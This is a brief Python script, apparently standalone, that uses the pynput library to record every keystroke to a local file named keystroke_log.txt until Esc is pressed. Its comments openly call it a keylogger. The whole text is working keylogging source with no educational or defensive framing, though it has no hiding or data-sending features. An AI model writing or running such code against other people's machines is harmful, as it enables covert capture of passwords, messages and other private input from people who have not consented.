from pynput.keyboard import Key, Listener

log_file = "keystroke_log.txt"

def on_press(key):
    # Logging the pressed key
    with open(log_file, 'a') as f:
        f.write(f"{key} pressed\n")

def on_release(key):
    # Stopping the keylogger
    if key == Key.esc:
        return False

# Setting up the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
    
